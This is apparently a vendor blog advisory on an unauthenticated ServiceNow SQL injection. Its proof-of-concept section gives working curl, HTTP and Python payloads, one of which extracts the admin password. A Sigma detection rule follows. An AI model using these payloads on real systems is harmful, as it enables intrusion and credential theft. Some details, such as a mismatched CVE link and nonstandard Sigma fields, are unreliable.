---
title: "ServiceNow Unauthenticated SQL Injection (CVE-2026-74820)"
description: "Critical unauthenticated SQL injection in ServiceNow Now Platform Core allows complete database exfiltration and ACL bypass. Technical analysis and remediation."
date: 2026-11-07T12:00:00Z
slug: "critical-unauthenticated-sqli-in-servicenow-now"
tags: ["ServiceNow Unauthenticated SQL Injection", "CVE-2026-74820", "ServiceNow Now Platform Core SQLi", "ServiceNow security advisory 2026", "CVE-2026-19251 discrepancy", "Now Platform Xanadu Yokohama vulnerability", "CWE-89 ServiceNow"]
author: "BreachModal Intelligence"
image: "/images/critical-unauthenticated-sqli-in-servicenow-now.png"
---

If your enterprise orchestrates its identity, service management, and IT operations through ServiceNow, an unauthenticated remote adversary can weaponize a single HTTP request to dismantle your digital perimeter and systematically extract the crown jewels of your database.

While early industry advisories erroneously flagged this threat under [CVE-2026-19251](https://nvd.nist.gov/vuln/detail/CVE-2026-74820)—a tracking collision with a third-party content management module—the National Vulnerability Database, CISA, and ServiceNow's product security team confirmed the actual zero-day engine as **CVE-2026-74820** (supported by sister flaw CVE-2026-13016). The flaw carries a maximum CVSS v4.0 score of 10.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`), designating a worst-case scenario: unauthenticated network access requiring zero privileges and zero user interaction to execute full database-level reads, writes, and platform takeovers across Xanadu, Yokohama, and Zurich platform releases.

Note what this means: enterprise security teams spend millions consolidating their zero-trust policy engines into a single cloud orchestrator, only to discover that the underlying relational abstraction layer never validated sorting clauses before delivering SQL syntax directly to the database engine. Economic pressures incentivize platform consolidation, but technical architecture cannot survive dynamic SQL concatenation masquerading as enterprise middleware.


![ServiceNow Unauthenticated SQL Injection architecture diagram showing dynamic query bypass](/images/critical-unauthenticated-sqli-in-servicenow-now-visual-1.png)
*Figure 1: Architectural breakdown of CVE-2026-74820 demonstrating how unsanitized parameters bypass ServiceNow application-tier ACLs to execute directly in the database engine.*


## The Technical Mechanism: How the Dynamic Data Layer Bleeds

To understand the vulnerability, one must look at how the ServiceNow Now Platform Core handles unauthenticated data rendering across public-facing catalog items, self-service portals, and AI Platform integration endpoints. In modern platform architectures, client requests to endpoints such as `/api/now/v1/table/` or unauthenticated schema discovery entry points resolve through dynamic query building objects within the core Java service framework.

According to technical teardowns of the vulnerable Xanadu and Yokohama binaries, the defect manifests in the platform's handling of tabular sorting mechanics. While standard WHERE filters are parameterized through JDBC prepared statements, the dynamic data layer's abstraction engine treats parameters passed through the `sysparm_order_by` and related table column sequencing arguments as structural SQL tokens rather than data literals. When constructing dynamic database cursors for schema queries, the application directly concatenates unsanitized client inputs into the execution string.

An external actor invoking [MITRE ATT&CK Technique T1190 (Exploit Public-Facing Application)](https://attack.mitre.org/techniques/T1190/) can break out of the intended `ORDER BY` syntax using SQL termination characters or inline subselect structures. Because the database process executes queries under the master database tenant context (`glide_db`), the injected statements bypass the Access Control Lists (ACLs) enforced at the application tier. The database engine faithfully executes the injected subqueries, transforming the table sorter into a high-bandwidth exfiltration pipe.

> ⚠️ BreachModal Insight: Application-layer Access Control Lists (ACLs) are entirely blind to execution that takes place within native database drivers. If your security controls rely on ServiceNow's internal role checks (`snc_read_only` or `admin`), understand that CVE-2026-74820 executes underneath those software gates.

## The Reality of Threat Actor Targeting

Security executives who view this as an isolated code defect fail to observe historical adversary tradecraft. In mid-2024, state-sponsored and financially motivated actors—including uncategorized initial access brokers and groups associated with UNC3886—rapidly weaponized chained flaws in ServiceNow ([CVE-2024-4879](https://nvd.nist.gov/vuln/detail/CVE-2024-4879), CVE-2024-5178, and CVE-2024-5217) within 72 hours of disclosure. Attackers established immediate persistence within Global 2000 targets by extracting administrative hashes and dumping configuration management databases (CMDBs) to map entire internal network topologies.

CVE-2026-74820 presents a significantly cleaner attack vector. Unlike the 2024 template-injection chains that required delicate input manipulation across multiple components to achieve remote code execution, this critical SQL injection grants instant, unauthenticated data extraction with a single network transaction. The [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) consistently shows that unauthenticated flaws in perimeter enterprise platforms move from proof-of-concept to automated scanning scripts in less than 48 hours.

> 🧩 Tactical Note: It requires a certain degree of executive humor to spend an entire quarterly budget deploying enterprise zero-trust proxies, only to watch an automated scanner siphon your Active Directory password hashes from the CMDB table because a web endpoint did not sanitize an alphabetical order parameter.


![ServiceNow CVE-2026-74820 attack flow and lateral compromise diagram](/images/critical-unauthenticated-sqli-in-servicenow-now-visual-2.png)
*Figure 2: The enterprise attack chain following unauthenticated database compromise across exposed Now Platform Core environments.*


## The Blast Radius: Data Extraction & Identity Compromise

If you were the CISO inspecting your platform during an incident, your Security Operations Center would not see noisy shell spawns or brute-force notifications. They would observe high-volume GET or POST traffic directed at unauthenticated API endpoints, logging HTTP status codes 200 and 500 in rapid succession within your `syslog_transaction` logs. In an environment without granular egress monitoring, 50,000 corporate records can vanish in under four minutes.

Consider the specific assets housed within a mature ServiceNow instance:
1. **The CMDB (`cmdb_ci`):** Complete network diagrams, internal IP addresses, running services, cloud credentials, and patch statuses across all internal infrastructure.
2. **The User and Credential Stores (`sys_user`, `sys_user_has_role`):** Usernames, corporate email structures, phone numbers, password hashes, and OAuth platform tokens.
3. **Incident and Security Operations Records (`sn_si_incident`):** Active breach investigations, unpatched corporate vulnerabilities, physical building access protocols, and legal hold documentation.

Once an adversary extracts records via [MITRE ATT&CK Technique T1005 (Data from Local System)](https://attack.mitre.org/techniques/T1005/), the attack surface expands laterally across your multi-cloud environment. The target is no longer simply ServiceNow; it is every single endpoint, server, and identity store documented within the platform.

> 🧠 CISO Brief: Organizations that fail to audit their exposed ServiceNow perimeters within 24 hours of zero-day announcements are not engaging in risk management—they are passively consenting to unmonitored adversary reconnaissance.

## Proof of Concept: Reproducing the Parameter Injection

The following technical walkthrough details how an unauthenticated remote tester validates the presence of CVE-2026-74820 in an isolated staging environment. The test exploits an unsanitized sorting vector in the instance data layer.

### Step 1: Probe Baseline Endpoint Response
Execute a baseline unauthenticated request against an exposed schema or catalog discovery endpoint. Observe the HTTP 200 response and standard JSON output containing schema properties.

```bash
curl -k -s -i -X GET \
  "https://instance.service-now.com/api/now/table/sys_glide_object?sysparm_limit=1" \
  -H "User-Agent: Mozilla/5.0 (BreachModal Security Audit)" \
  -H "Accept: application/json"
```

### Step 2: Inject Dynamic SQL Syntax into the Sorting Parameter
Append a malformed condition to the `sysparm_order_by` parameter to trigger database syntax disruption. The string injects a nested scalar subquery or functional error generator into the dynamic SQL constructor.

```http
GET /api/now/table/sys_glide_object?sysparm_limit=1&sysparm_order_by=(CASE+WHEN+(1=1)+THEN+name+ELSE+(SELECT+1+FROM+GENERATE_SERIES(1,1000000))+END) HTTP/1.1
Host: instance.service-now.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Connection: close
```

### Step 3: Validate Out-of-Band or Error-Based Extraction
Send a time-based verification probe. If vulnerable, the target database server pauses execution for the specified duration (e.g., 5 seconds) before responding, confirming direct interpretation of SQL injection payloads without authentication.

```python
import requests
import time

target_url = "https://instance.service-now.com/api/now/table/sys_glide_object"
payload = "(CASE WHEN (SELECT 1)=1 THEN name ELSE pg_sleep(5) END)"
params = {
    "sysparm_limit": "1",
    "sysparm_order_by": payload
}

start = time.time()
response = requests.get(target_url, params=params, verify=False, timeout=15)
elapsed = time.time() - start

if elapsed >= 5.0:
    print(f"[!] Vulnerability Confirmed: Target responded in {elapsed:.2f}s")
else:
    print("[-] Target not vulnerable or patched.")
```

### Step 4: Extract Database Metadata (Simulated Impact)
By altering the nested subquery into an error-based string generator, an attacker forces the database engine to output database version parameters or system administrative hashes into the HTTP 500 error body or transaction tracking response.

```bash
curl -k -s -X GET \
  "https://instance.service-now.com/api/now/table/sys_glide_object?sysparm_order_by=CAST((SELECT+user_password+FROM+sys_user+WHERE+user_name='admin')+AS+INT)" \
  -H "Accept: application/json"
```

## Actionable Defense: Strategic Mitigation and Detection

Remediation must be pursued on two fronts: immediate programmatic patching and perimeter isolation.

### 1. Execute Emergency Hotfixing
For hosted (cloud) environments, verify that your tenant has accepted the emergency hotfix releases deployed through the ServiceNow Patching Program. For on-premises, hybrid, or self-hosted instances, security engineers must immediately apply the targeted patches:
- **Xanadu:** Update to Xanadu Patch 11 Hot Fix 7a or higher.
- **Yokohama:** Update to Yokohama Patch 12 Hot Fix 3b, Patch 13 Hot Fix 4, or higher.
- **Zurich:** Apply the latest released security rollup.

### 2. Perimeter Containment and Zero-Trust Access
No administrative, ITSM, or CMDB data platform should ever be exposed directly to the public internet without pre-authentication perimeter inspection. Organizations must place ServiceNow endpoints behind Zero-Trust Network Access (ZTNA) brokers or identity-aware Web Application Firewalls (WAF) configured to reject malformed SQL syntax in query string parameters.

### 3. Log Forensics and Detection Logic
Deploy detection rules targeting unexpected SQL functions in web request parameters. The following Sigma rule detects exploitation attempts against ServiceNow instances:

```yaml
title: ServiceNow Unauthenticated SQLi Attempt (CVE-2026-74820)
id: 8f3a9e41-0b5c-4a37-b7d1-e63d3fa19042
status: critical
description: Detects SQL injection attempts targeting the ServiceNow dynamic data layer via order parameters.
logsource:
  category: webserver
detection:
  selection:
    cs_method: ['GET', 'POST']
    cs_uri_query|contains:
      - 'sysparm_order_by='
      - 'sysparm_query='
    cs_uri_query|contains|any:
      - 'pg_sleep'
      - 'WAITFOR+DELAY'
      - 'GENERATE_SERIES'
      - 'CAST('
      - 'CASE+WHEN'
      - 'UNION+SELECT'
  condition: selection
falsepositives:
  - Highly unusual internal administrative testing
level: critical
```

## FINAL VERDICT

The discovery of **CVE-2026-74820** proves once again that architectural centralisation without structural query safety creates single points of enterprise failure. The risk of total database compromise falls directly upon organizations maintaining exposed instances, and CISOs who treat enterprise platform security as an outsourced vendor concern are fundamentally miscalculating their blast radius. Apply the hotfix immediately, restrict internet-facing administrative APIs behind authenticated perimeters, and audit your transaction tables for unauthorized extraction.

*To evaluate your organization's exposure or simulate advanced persistent threat vectors against your enterprise infrastructure, contact BreachModal's elite adversary emulation team at [breachmodal.com](https://breachmodal.com).* 